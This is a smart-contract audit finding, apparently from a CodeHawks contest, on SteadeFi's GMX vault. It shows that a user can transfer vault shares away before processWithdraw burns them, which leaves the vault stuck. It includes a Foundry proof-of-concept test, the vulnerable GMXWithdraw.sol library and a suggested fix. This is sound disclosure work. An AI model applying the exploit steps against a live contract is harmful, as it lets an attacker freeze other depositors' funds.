{
  "Title": "User can revert processWithdraw",
  "Content": "# User can revert processWithdraw\n\n### Severity\nMedium Risk\n\n### Relevant GitHub Links\n<a data-meta=\"codehawks-github-link\" href=\"https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXWithdraw.sol#L197\">https://github.com/Cyfrin/2023-10-SteadeFi/blob/0f909e2f0917cb9ad02986f631d622376510abec/contracts/strategy/gmx/GMXWithdraw.sol#L197</a>\n\n\n## Summary\n\nWhen a user wants to withdraw his tokens after depositing, the LP tokens are first sent to GMX. GMX then sends back the deposited tokens. Before the user receives them, their Vault Shares are burned in processWithdraw:\n\n```solidity\nFile: GMXWithdraw.sol#processWithdraw\n197: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);\n```\n\nA user could, after the LP tokens have been transferred to GMX and the Vault is waiting for the callback, transfer his Vault Shares away from his address. This would result in not having enough tokens left during the burn, causing a revert. Afterward, the Vault would be stuck in the 'Withdraw' state because, although the keeper could call the function again, it would result in revert again.\n\n## Vulnerability Details\n\nHere is a POC that demonstrates how a user can cause the processWithdraw to revert:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\nimport { console, console2 } from \"forge-std/Test.sol\";\nimport { TestUtils } from \"../../helpers/TestUtils.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { IERC20Errors } from \"@openzeppelin/contracts/interfaces/draft-IERC6093.sol\";\nimport { GMXMockVaultSetup } from \"./GMXMockVaultSetup.t.sol\";\nimport { GMXTypes } from \"../../../contracts/strategy/gmx/GMXTypes.sol\";\nimport { GMXTestHelper } from \"./GMXTestHelper.sol\";\n\nimport { IDeposit } from \"../../../contracts/interfaces/protocols/gmx/IDeposit.sol\";\nimport { IEvent } from \"../../../contracts/interfaces/protocols/gmx/IEvent.sol\";\nimport { Attacker } from \"./Attacker.sol\";\n\ncontract GMXDepositTest is GMXMockVaultSetup, GMXTestHelper, TestUtils {\n    function test_POC4() public {\n        //owner deposits\n        vm.startPrank(address(owner));\n        _createAndExecuteDeposit(address(WETH), address(USDC), address(WETH), 10 ether, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n\n        //user1 deposits\n        vm.startPrank(address(user1));\n        _createAndExecuteDeposit(address(WETH), address(USDC), address(WETH), 10 ether, 0, SLIPPAGE, EXECUTION_FEE);\n        vm.stopPrank();\n        \n        uint256 vaultSharesAmt = IERC20(address(vault)).balanceOf(address(user1)); //Vault Shares from user1 to withdraw\n        vm.startPrank(address(user1));\n        _createWithdrawal(address(USDC), vaultSharesAmt, 0, SLIPPAGE, EXECUTION_FEE); //User 1 creates a withdrawal\n        IERC20(address(vault)).transfer(address(user2), vaultSharesAmt); //Before processWithdraw is executed and the user's Vault Shares are burned, he sends them away\n\n        vm.expectRevert(\n            abi.encodeWithSelector(IERC20Errors.ERC20InsufficientBalance.selector, address(user1), 0, vaultSharesAmt)\n        );\n        mockExchangeRouter.executeWithdrawal(address(WETH), address(USDC), address(vault), address(callback)); //executeWithdraw reverted as there are no tokens to burn\n        vm.stopPrank();\n\n        GMXTypes.Store memory _store = vault.store();\n        assert(uint256(_store.status) == uint256(GMXTypes.Status.Withdraw)); //shows that the vault is still in the Withdraw status\n    }\n}\n```\n\nThe POC can be started with this command: `forge test --match-test test_POC4 -vv`\n\n## Impact\n\nA user could put the Vault into a 'Stuck' state that can only be exited through 'emergencyPause' and 'emergencyResume.' This would take some time as 'emergencyResume' can only be called by the owner, who is a Multisig with a Timelock. (A keeper could also call 'processWithdrawCancellation,' but in this case, the debt to the lending vault would not be repaid. The tokens withdrawn by GMX would simply remain in the vault, and the user's Vault Shares would not be burned.)\n\n## Tools Used\n\nVSCode, Foundry\n\n## Recommendations\n\nTokens should be burned immediately after remove liquidity is called in GMXWithdraw.sol:\n```diff\n+ 154: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);\n- 197: self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);\n```",
  "Impact": "HIGH",
  "Source": "https://www.codehawks.com/contests/clo38mm260001la08daw5cbuf",
  "Code": [
    {
      "filename": "contracts/strategy/gmx/GMXWithdraw.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.21;\n\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport { GMXTypes } from \"./GMXTypes.sol\";\nimport { GMXReader } from \"./GMXReader.sol\";\nimport { GMXChecks } from \"./GMXChecks.sol\";\nimport { GMXManager } from \"./GMXManager.sol\";\nimport { GMXProcessWithdraw } from \"./GMXProcessWithdraw.sol\";\n\n/**\n  * @title GMXWithdraw\n  * @author Steadefi\n  * @notice Re-usable library functions for withdraw operations for Steadefi leveraged vaults\n*/\nlibrary GMXWithdraw {\n  using SafeERC20 for IERC20;\n\n  /* ====================== CONSTANTS ======================== */\n\n  uint256 public constant SAFE_MULTIPLIER = 1e18;\n\n  /* ======================== EVENTS ========================= */\n\n  event WithdrawCreated(address indexed user, uint256 shareAmt);\n  event WithdrawCompleted(\n    address indexed user,\n    address token,\n    uint256 tokenAmt\n  );\n  event WithdrawCancelled(address indexed user);\n  event WithdrawFailed(bytes reason);\n\n  /* ================== MUTATIVE FUNCTIONS =================== */\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function withdraw(\n    GMXTypes.Store storage self,\n    GMXTypes.WithdrawParams memory wp\n  ) external {\n    // Sweep any tokenA/B in vault to the temporary trove for future compouding and to prevent\n    // it from being considered as part of withdrawers assets\n    if (self.tokenA.balanceOf(address(this)) > 0) {\n      self.tokenA.safeTransfer(self.trove, self.tokenA.balanceOf(address(this)));\n    }\n    if (self.tokenB.balanceOf(address(this)) > 0) {\n      self.tokenB.safeTransfer(self.trove, self.tokenB.balanceOf(address(this)));\n    }\n\n    self.refundee = payable(msg.sender);\n\n    GMXTypes.HealthParams memory _hp;\n\n    _hp.equityBefore = GMXReader.equityValue(self);\n    _hp.lpAmtBefore = GMXReader.lpAmt(self);\n    _hp.debtRatioBefore = GMXReader.debtRatio(self);\n    _hp.deltaBefore = GMXReader.delta(self);\n\n    GMXTypes.WithdrawCache memory _wc;\n\n    _wc.user = payable(msg.sender);\n\n    _wc.shareRatio = wp.shareAmt\n      * SAFE_MULTIPLIER\n      / IERC20(address(self.vault)).totalSupply();\n    _wc.lpAmt = _wc.shareRatio\n      * GMXReader.lpAmt(self)\n      / SAFE_MULTIPLIER;\n    _wc.withdrawValue = _wc.lpAmt\n      * self.gmxOracle.getLpTokenValue(\n        address(self.lpToken),\n        address(self.tokenA),\n        address(self.tokenA),\n        address(self.tokenB),\n        false,\n        false\n      )\n      / SAFE_MULTIPLIER;\n\n    _wc.withdrawParams = wp;\n    _wc.healthParams = _hp;\n\n    (\n      uint256 _repayTokenAAmt,\n      uint256 _repayTokenBAmt\n    ) = GMXManager.calcRepay(self, _wc.shareRatio);\n\n    _wc.repayParams.repayTokenAAmt = _repayTokenAAmt;\n    _wc.repayParams.repayTokenBAmt = _repayTokenBAmt;\n\n    self.withdrawCache = _wc;\n\n    GMXChecks.beforeWithdrawChecks(self);\n\n    self.status = GMXTypes.Status.Withdraw;\n\n    self.vault.mintFee();\n\n    GMXTypes.RemoveLiquidityParams memory _rlp;\n\n    // If user wants to withdraw LP tokens, only remove liquidity of\n    // LP tokens that are proportionately borrowed to repay debt\n    // If not, we just remove all LP tokens computed in _wc.lpAmt\n    if (wp.token == address(self.lpToken)) {\n      // LP amount to be removed for leverage debt repayment\n      // Multiply LP amt to remove by 2% to account for price differential,\n      // fees on LP removal, slippages to ensure payment of debt is covered\n      // Excess tokenA/B will be returned to the user regardless\n      uint256 _lpAmtToRemove = _wc.lpAmt\n        * (self.leverage - SAFE_MULTIPLIER)\n        / self.leverage\n        * 10200 / 10000;\n\n      _wc.tokensToUser = _wc.lpAmt - _lpAmtToRemove;\n      _wc.lpAmt = _lpAmtToRemove;\n    }\n\n\n    // If delta strategy is Long, remove all in tokenB to make it more\n    // efficent to repay tokenB debt as Long strategy only borrows tokenB\n    if (self.delta == GMXTypes.Delta.Long) {\n      address[] memory _tokenASwapPath = new address[](1);\n      _tokenASwapPath[0] = address(self.lpToken);\n      _rlp.tokenASwapPath = _tokenASwapPath;\n\n      (_rlp.minTokenAAmt, _rlp.minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n        self,\n        _wc.lpAmt,\n        address(self.tokenB),\n        address(self.tokenB),\n        wp.slippage\n      );\n    } else {\n      (_rlp.minTokenAAmt, _rlp.minTokenBAmt) = GMXManager.calcMinTokensSlippageAmt(\n        self,\n        _wc.lpAmt,\n        address(self.tokenA),\n        address(self.tokenB),\n        wp.slippage\n      );\n    }\n\n    _rlp.lpAmt = _wc.lpAmt;\n    _rlp.executionFee = wp.executionFee;\n\n    _wc.withdrawKey = GMXManager.removeLiquidity(\n      self,\n      _rlp\n    );\n\n    // Add withdrawKey to store\n    self.withdrawCache = _wc;\n\n    emit WithdrawCreated(\n      _wc.user,\n      _wc.withdrawParams.shareAmt\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdraw(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessWithdrawChecks(self);\n\n    // We transfer the core logic of this function to GMXProcessWithdraw.processWithdraw()\n    // to allow try/catch here to catch for any issues such as any token swaps failing or\n    // debt repayment failing, or any checks in afterWithdrawChecks() failing.\n    // If there are any issues, a WithdrawFailed event will be emitted and processWithdrawFailure()\n    // should be triggered to refund assets accordingly and reset the vault status to Open again.\n    try GMXProcessWithdraw.processWithdraw(self) {\n      // If native token is being withdrawn, we convert wrapped to native\n      if (self.withdrawCache.withdrawParams.token == address(self.WNT)) {\n        self.WNT.withdraw(self.withdrawCache.tokensToUser);\n        (bool success, ) = self.withdrawCache.user.call{value: address(this).balance}(\"\");\n        require(success, \"Transfer failed.\");\n      } else {\n        // Transfer requested withdraw asset to user\n        IERC20(self.withdrawCache.withdrawParams.token).safeTransfer(\n          self.withdrawCache.user,\n          self.withdrawCache.tokensToUser\n        );\n      }\n\n      // Transfer any remaining tokenA/B that was unused (due to slippage) to user as well\n      self.tokenA.safeTransfer(self.withdrawCache.user, self.tokenA.balanceOf(address(this)));\n      self.tokenB.safeTransfer(self.withdrawCache.user, self.tokenB.balanceOf(address(this)));\n\n      // Burn user shares\n      self.vault.burn(self.withdrawCache.user, self.withdrawCache.withdrawParams.shareAmt);\n\n      self.status = GMXTypes.Status.Open;\n\n      emit WithdrawCompleted(\n        self.withdrawCache.user,\n        self.withdrawCache.withdrawParams.token,\n        self.withdrawCache.tokensToUser\n      );\n    } catch (bytes memory reason) {\n      self.status = GMXTypes.Status.Withdraw_Failed;\n\n      emit WithdrawFailed(reason);\n    }\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdrawCancellation(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessWithdrawCancellationChecks(self);\n\n    self.status = GMXTypes.Status.Open;\n\n    emit WithdrawCancelled(self.withdrawCache.user);\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdrawFailure(\n    GMXTypes.Store storage self,\n    uint256 slippage,\n    uint256 executionFee\n  ) external {\n    GMXChecks.beforeProcessAfterWithdrawFailureChecks(self);\n\n    // Re-borrow assets based on the repaid amount\n    GMXManager.borrow(\n      self,\n      self.withdrawCache.repayParams.repayTokenAAmt,\n      self.withdrawCache.repayParams.repayTokenBAmt\n    );\n\n    // Re-add liquidity using all available tokenA/B in vault\n    GMXTypes.AddLiquidityParams memory _alp;\n\n    _alp.tokenAAmt = self.tokenA.balanceOf(address(this));\n    _alp.tokenBAmt = self.tokenB.balanceOf(address(this));\n\n    // Calculate slippage\n    uint256 _depositValue = GMXReader.convertToUsdValue(\n      self,\n      address(self.tokenA),\n      self.tokenA.balanceOf(address(this))\n    )\n    + GMXReader.convertToUsdValue(\n      self,\n      address(self.tokenB),\n      self.tokenB.balanceOf(address(this))\n    );\n\n    _alp.minMarketTokenAmt = GMXManager.calcMinMarketSlippageAmt(\n      self,\n      _depositValue,\n      slippage\n    );\n    _alp.executionFee = executionFee;\n\n    // Re-add liquidity with all tokenA/tokenB in vault\n    self.withdrawCache.depositKey = GMXManager.addLiquidity(\n      self,\n      _alp\n    );\n  }\n\n  /**\n    * @notice @inheritdoc GMXVault\n    * @param self GMXTypes.Store\n  */\n  function processWithdrawFailureLiquidityAdded(\n    GMXTypes.Store storage self\n  ) external {\n    GMXChecks.beforeProcessAfterWithdrawFailureLiquidityAdded(self);\n\n    self.status = GMXTypes.Status.Open;\n  }\n}"
    }
  ]
}